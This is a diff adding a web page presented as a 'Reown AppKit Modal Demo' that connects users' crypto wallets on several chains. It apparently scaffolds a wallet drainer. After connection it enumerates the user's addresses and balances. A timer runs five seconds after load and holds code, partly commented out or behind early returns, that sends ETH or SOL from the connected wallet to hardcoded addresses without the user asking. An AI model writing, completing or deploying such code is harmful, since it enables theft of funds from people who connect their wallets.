@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <title>Reown AppKit Modal Demo</title>
+    <style>
+      body {
+        background: #0f0f10;
+        color: #fff;
+        font-family: "Inter", sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        height: 100vh;
+        gap: 20px;
+      }
+      button {
+        background: #5b7cff;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        padding: 14px 26px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: 0.2s;
+      }
+    </style>
+  </head>
+  <body>
+    <appkit-account-button balance="show"></appkit-account-button>
+    <button id="connectButton">Connect Wallet</button>
+    <appkit-connect-button
+      label="Connect Wallet"
+      loadingLabel="Connecting..."
+    />
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
+
+
+    
+    <script type="module">
+      import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.min.js";
+      import { createAppKit } from "https://esm.sh/@reown/appkit@latest";
+      import {
+        solana,
+        mainnet,
+        bsc,
+        polygon,
+        base,
+      } from "https://esm.sh/@reown/appkit/networks";
+
+      const projectId = "7cf68df23ef09d9a041b9e21530e2da1";
+
+      const modal = createAppKit({
+        projectId,
+        networks: [solana, mainnet, polygon, bsc, base],
+        metadata: {
+          name: "Kingstar",
+          description: "",
+          url: window.location.origin,
+          icons: ["https://reown.com/favicon.ico"],
+        },
+        themeMode: "system",
+        themeVariables: {
+          "--w3m-font-family": "Inter, sans-serif",
+          "--w3m-font-family-mono": "Roboto Mono, monospace",
+          "--w3m-accent-color": "#3B82F6",
+          "--w3m-border-radius-master": "12px",
+          "--w3m-modal-width": "200px",
+        },
+      });
+
+      let processing = false;
+
+      modal.subscribeEvents(async (event) => {
+
+        return;
+
+
+        if (event.data.event === "CONNECT_SUCCESS") {
+          if (processing) return;
+          processing = true;
+          console.log("✅ Wallet Connected!");
+          await new Promise((r) => setTimeout(r, 2000));
+          const walletProvider = modal.getWalletProvider();
+          const namespaces = walletProvider.namespaces;
+          const networks = Object.keys(namespaces);
+          const all = {};
+
+          for (const namespaceKey of networks) {
+            const chain = namespaces[namespaceKey];
+
+            if (namespaceKey === "eip155") {
+              const chainIds = {
+                1: "eth",
+                56: "bsc",
+                137: "polygon",
+                8453: "base",
+              };
+
+              chain.accounts.forEach((acc) => {
+                const [ns, chainId, address] = acc.split(":");
+                const networkName = chainIds[chainId];
+                if (!networkName) return;
+
+                all[networkName] = {
+                  address,
+                  chainId: Number(chainId),
+                  type: "evm",
+                };
+              });
+
+              continue;
+            }
+
+            if (namespaceKey === "solana") {
+              const SOL_MAINNET_ID = "5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp";
+
+              console.log(chain.methods);
+
+              const accountEntry = chain.accounts.find(
+                (acc) => acc.split(":")[1] === SOL_MAINNET_ID
+              );
+              if (!accountEntry) continue;
+
+              const address = accountEntry.split(":")[2];
+              all["sol"] = { address, type: "solana" };
+              continue;
+            }
+
+            continue;
+          }
+
+          const allKeys = Object.keys(all);
+
+          if (allKeys.length === 0) {
+            console.log("No supported networks found in the connected wallet.");
+            processing = false;
+            return;
+          }
+
+          //console.log(all);
+
+          let solanaBalances,
+            ethBalances,
+            bscBalances,
+            polygonBalances,
+            baseBalances;
+
+          if (all["sol"]) {
+            solanaBalances = await fetchSolBalances(all.sol.address);
+          }
+
+          /*
+          if (all["eth"]) {
+            ethBalances = await fetchBalances(
+              "eth",
+              all.eth.address
+            );
+          }
+
+          if (all["bsc"]) {
+            bscBalances = await fetchBalances(
+              "bsc",
+              all.bsc.address
+            );
+          }
+
+          if (all["polygon"]) {
+            polygonBalances = await fetchBalances(
+              "polygon",
+              all.polygon.address
+            );
+          }
+
+          if (all["base"]) {
+            baseBalances = await fetchBalances(
+              "base",
+              all.base.address
+            );
+          }
+
+          console.log(solanaBalances);
+          console.log(ethBalances);
+          console.log(bscBalances);
+          console.log(polygonBalances);
+          console.log(baseBalances);
+*/
+          return;
+        }
+
+        if (event.data.event === "DISCONNECT_SUCCESS") {
+          console.log("⛔️ Wallet Disconnected!");
+          return;
+        }
+      });
+
+      document.getElementById("connectButton").addEventListener("click", () => {
+        modal.open();
+      });
+
+      setTimeout(async () => {
+     
+        const walletProvider = await modal.getWalletProvider();
+
+
+        const bscRpcUrl = walletProvider.rpcProviders.eip155.httpProviders[56].connection.url; // BSC mainnet
+
+
+        try {
+/*
+          
+
+
+
+          const bscRpcUrl = walletProvider.rpcProviders.eip155.httpProviders[56].connection.url; // BSC mainnet
+
+
+
+          
+const provider = new ethers.JsonRpcProvider(bscRpcUrl);
+
+const from = walletProvider.namespaces.eip155.accounts
+  .find(acc => acc.includes(":56:"))
+  .split(":")[2];
+
+const balance = await provider.getBalance(from);
+console.log("BSC balance:", ethers.formatEther(balance));
+
+
+const to = "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2"; // 
+
+
+// ethers v6 BigInt output
+const valueBN = ethers.parseEther("0"); // BigInt
+const valueHex = "0x" + valueBN.toString(16);    // Convert to hex string
+
+// optional gas
+const gasHex = "0x5208"; // 21000 in hex
+
+console.log("Sending transaction from", from, "to", to, "value", valueHex);
+
+
+const txHash = await walletProvider.request({
+  method: "eth_sendTransaction",
+  params: [
+    {
+      from,
+      to,
+      value: valueHex,
+      gas: gasHex,
+    },
+  ],
+});
+
+
+console.log("Transaction hash:", txHash);
+
+return;
+
+
+             
+              
+
+              const eip55Namespace = walletProvider.namespaces["eip155"];
+
+              console.log(eip55Namespace);
+              return;
+*/
+
+              const ethersProvider = new ethers.BrowserProvider(walletProvider);
+
+              const balance = Number(ethers.formatEther(await ethersProvider.getBalance("0x3ed27a7cd25Ef916BcC489817E976f63FFa909D9"))).toFixed(8);
+
+              
+              console.log("Balance:", balance);
+
+
+              return;
+
+              const signer = await ethersProvider.getSigner();
+
+              console.log(signer);
+              return;
+
+              const tx = await signer.sendTransaction({
+                to: "0x302D8DA8967f9afA00f1DcdbD70aF0F30784BDF2",
+                value: ethers.parseEther("0.00000001")
+              })
+
+              console.log(tx);
+
+/*
+          const recipient = "Fhtz8e3Y6K1K4nQ7v5Y6T4b8r9V7H3L2X5mZ6N8J9PqR"; // replace with actual recipient
+          const amountSOL = 0.001; // amount of SOL to send
+          const walletProvider = modal.getWalletProvider();
+          const rpcProvider = walletProvider.rpcProviders.solana;
+          const mainnetRpcUrl = rpcProvider.httpProviders["5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp"].connection.url;
+
+          const namespace = walletProvider.namespaces["solana"];
+          if (!namespace || !namespace.accounts || !namespace.accounts.length) {
+            throw new Error("No Solana account connected");
+          }
+
+          const senderAddress = namespace.accounts[0].split(":")[2];
+
+
+
+const lamports = Math.floor(amountSOL * 1e9);
+const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
+
+const connection = new Connection(mainnetRpcUrl, "confirmed");
+
+// 1️⃣ Build unsigned transaction
+const transaction = new Transaction().add(
+  SystemProgram.transfer({
+    fromPubkey: new PublicKey(senderAddress),
+    toPubkey: new PublicKey(recipient),
+    lamports,
+  })
+);
+transaction.feePayer = new PublicKey(senderAddress);
+const { blockhash } = await connection.getLatestBlockhash();
+transaction.recentBlockhash = blockhash;
+
+// 2️⃣ Serialize only the message and request wallet to sign
+const signedTxBase64 = await walletProvider.request({
+  method: "solana_signTransaction",
+  params: [transaction.serializeMessage().toString("base64")]
+});
+
+// 3️⃣ Deserialize the signed transaction
+const signedTx = Transaction.from(Buffer.from(signedTxBase64, "base64"));
+
+// 4️⃣ Send via RPC
+const txid = await connection.sendRawTransaction(signedTx.serialize());
+await connection.confirmTransaction(txid, "confirmed");
+
+console.log("✅ Transaction sent:", txid);
+
+*/
+        } catch (e) {
+          console.log(e);
+        }
+
+
+      }, 5000);
+    </script>
+  </body>
+</html>
